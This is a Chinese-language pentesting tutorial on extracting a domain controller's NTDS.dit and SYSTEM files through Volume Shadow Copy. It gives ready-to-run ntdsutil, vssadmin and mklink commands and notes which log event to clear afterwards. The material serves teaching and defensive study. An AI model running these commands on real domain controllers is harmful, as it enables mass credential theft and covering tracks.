# 网络安全系统教程：P43：Volume Shadow Copy

## 概述
在本节课中，我们将学习如何利用Windows的卷影复制服务来获取域控制器上的关键文件，特别是存储所有域用户密码哈希的`NTDS.dit`数据库文件。这是域渗透中获取凭证信息的关键技术之一。

## 活动目录数据库简介
上一节我们介绍了域的基本概念，本节中我们来看看域内用户凭证的存储核心——活动目录数据库。

活动目录数据库是一个名为`NTDS.dit`的文件。这个文件被称为AD数据库，其中包含了域用户、组、组成员关系等信息，**最重要的是，它包含了域中所有用户的密码哈希值**。

![](img/119703af83d13bdce2d433e6bf0f3e34_7.png)

![](img/119703af83d13bdce2d433e6bf0f3e34_9.png)

![](img/119703af83d13bdce2d433e6bf0f3e34_11.png)

![](img/119703af83d13bdce2d433e6bf0f3e34_13.png)

为了理解其重要性，我们可以回顾一下工作组与域的区别：
*   在工作组环境中，本地用户的密码哈希存储在`SAM`文件中。
*   在域环境中，所有域用户的密码哈希都集中存储在域控制器上的`NTDS.dit`文件中。

![](img/119703af83d13bdce2d433e6bf0f3e34_14.png)

![](img/119703af83d13bdce2d433e6bf0f3e34_16.png)

![](img/119703af83d13bdce2d433e6bf0f3e34_17.png)

为了保护这些哈希值，Windows系统会使用存储在`SYSTEM`注册表配置单元中的一个密钥对其进行加密。因此，无论是解密`SAM`文件还是`NTDS.dit`文件，都需要对应的`SYSTEM`文件。

![](img/119703af83d13bdce2d433e6bf0f3e34_19.png)

以下是这些关键文件的默认存储路径：
*   `%SYSTEMROOT%\System32\config\SAM` - 存储本地用户密码哈希。
*   `%SYSTEMROOT%\System32\config\SYSTEM` - 存储解密`SAM`文件所需的密钥。
*   `%SYSTEMROOT%\NTDS\NTDS.dit` - 存储域用户密码哈希（仅存在于域控制器）。

![](img/119703af83d13bdce2d433e6bf0f3e34_21.png)

![](img/119703af83d13bdce2d433e6bf0f3e34_22.png)

> **注意**：`%SYSTEMROOT%`通常是`C:\Windows`。

由于Windows系统会阻止对`NTDS.dit`文件进行直接的读取或复制操作（提示“文件正在使用”），我们必须使用特殊的技术来获取它。这就是本节课要介绍的核心内容。

## 卷影复制服务原理
我们将要利用的核心技术是**卷影复制服务**。

VSS是Windows系统上的一个服务框架，主要用于数据备份。它支持Windows Server 2003及以上的操作系统，并且默认开启。该服务会在特定条件下自动创建数据备份。我们正是利用其创建“快照”的功能，来绕过系统对`NTDS.dit`文件的访问限制。

## 利用NTDSUTIL工具
NTDSUTIL是一个活动目录管理命令行工具，在域环境中默认安装。我们可以用它来创建和管理卷影副本。

### 交互式操作流程
以下是使用NTDSUTIL获取`NTDS.dit`文件的完整交互式步骤，这有助于理解整个过程：

![](img/119703af83d13bdce2d433e6bf0f3e34_29.png)

![](img/119703af83d13bdce2d433e6bf0f3e34_31.png)

1.  打开命令提示符，输入`ntdsutil`进入工具。
2.  输入`snapshot`进入快照管理菜单。
3.  输入`activate instance ntds`设置活动实例。
4.  输入`create`创建快照。成功后，会返回一个快照的GUID。
5.  输入`mount {GUID}`挂载该快照。成功后，会返回一个可访问的挂载路径（如`C:\$SNAP_202410211134_VOLUMEC$\`）。
6.  此时，可以通过文件管理器或`copy`命令，从挂载路径下的`Windows\NTDS\`目录中复制`NTDS.dit`文件，以及从`Windows\System32\config\`目录复制`SYSTEM`文件。
7.  复制完成后，输入`unmount {GUID}`卸载快照。
8.  输入`delete {GUID}`删除快照。
9.  输入两次`quit`退出ntdsutil。

![](img/119703af83d13bdce2d433e6bf0f3e34_33.png)

### 非交互式命令
在实际渗透中，我们更常使用单条命令的非交互式操作。以下是几个关键命令：

**1. 列出已有快照**
```cmd
ntdsutil snapshot "list all" quit quit
```
此命令可以查看系统上已存在的快照，有时可能直接利用管理员创建的历史快照。

**2. 创建并挂载快照（传统方式）**
```cmd
ntdsutil snapshot "activate instance ntds" create quit quit
```
```cmd
ntdsutil snapshot "mount {GUID}" quit quit
```
```cmd
copy C:\$SNAP_202410211134_VOLUMEC$\Windows\NTDS\ntds.dit C:\target\ntds.dit
```
```cmd
ntdsutil snapshot "unmount {GUID}" "delete {GUID}" quit quit
```

![](img/119703af83d13bdce2d433e6bf0f3e34_35.png)

**3. 创建快照并自动提取文件（推荐）**
这是更高效的方法，使用`IFM`（可安装介质）创建选项。
```cmd
ntdsutil "ac i ntds" "ifm" "create full C:\temp" quit quit
```
执行此命令后，`NTDS.dit`和`SYSTEM`等关键文件会自动被复制到指定的目录（如`C:\temp`）中。

## 利用VSSAdmin工具
VSSAdmin是卷影复制服务的另一个管理工具，同样预装在域环境中。

![](img/119703af83d13bdce2d433e6bf0f3e34_48.png)

![](img/119703af83d13bdce2d433e6bf0f3e34_49.png)

![](img/119703af83d13bdce2d433e6bf0f3e34_51.png)

![](img/119703af83d13bdce2d433e6bf0f3e34_52.png)

![](img/119703af83d13bdce2d433e6bf0f3e34_53.png)

![](img/119703af83d13bdce2d433e6bf0f3e34_54.png)

以下是使用VSSAdmin的步骤：

![](img/119703af83d13bdce2d433e6bf0f3e34_56.png)

![](img/119703af83d13bdce2d433e6bf0f3e34_58.png)

1.  **创建卷影副本**：
    ```cmd
    vssadmin create shadow /for=C:
    ```
    此命令为C盘创建卷影副本，并返回副本ID和卷影副本设备名（如`\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1`）。

2.  **复制文件**：
    ```cmd
    copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit C:\target\ntds.dit
    copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\target\SYSTEM
    ```

3.  **删除卷影副本**：
    ```cmd
    vssadmin delete shadows /shadow={副本ID} /quiet
    ```

## 利用VSSOwn工具及其他扩展
VSSOwn是一个允许任何用户创建卷影副本的命令行工具，但默认不随系统提供，需要从Windows SDK中获取。

![](img/119703af83d13bdce2d433e6bf0f3e34_66.png)

![](img/119703af83d13bdce2d433e6bf0f3e34_67.png)

其使用方式与VSSAdmin类似，通过特定命令创建副本、复制文件，最后删除副本。由于不是默认工具，此处不展开详述。

![](img/119703af83d13bdce2d433e6bf0f3e34_69.png)

### 操作痕迹与拓展技巧
在使用VSS相关技术时，需要注意以下两点：

![](img/119703af83d13bdce2d433e6bf0f3e34_71.png)

![](img/119703af83d13bdce2d433e6bf0f3e34_73.png)

![](img/119703af83d13bdce2d433e6bf0f3e34_75.png)

![](img/119703af83d13bdce2d433e6bf0f3e34_77.png)

![](img/119703af83d13bdce2d433e6bf0f3e34_78.png)

**1. 日志痕迹**
通过VSS服务创建卷影副本，通常会在系统日志中生成**事件ID为98**的日志记录。在后期进行痕迹清除时，需要关注此类日志。

**2. 访问卷影副本的替代方法**
使用VSSAdmin创建的卷影副本路径无法直接在资源管理器中访问。可以通过创建符号链接来方便地访问：
```cmd
# 创建符号链接
mklink /d C:\testvsc \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
# 通过链接访问和复制文件
copy C:\testvsc\Windows\NTDS\ntds.dit C:\target\
# 删除符号链接
rd C:\testvsc
```

## 总结
本节课我们一起学习了如何利用Windows卷影复制服务来获取域控制器上的`NTDS.dit`活动目录数据库文件。我们介绍了三种主要工具：
1.  **NTDSUTIL**：域环境原生工具，功能强大，推荐使用`IFM`模式一键提取。
2.  **VSSAdmin**：系统自带VSS管理工具，命令直观。
3.  **VSSOwn**：第三方工具，适用性更广。

![](img/119703af83d13bdce2d433e6bf0f3e34_80.png)

掌握这些技术，是成功进行域内凭证提取的关键一步。在后续课程中，我们将学习如何解密获取到的`NTDS.dit`文件，从而得到域用户的密码哈希。
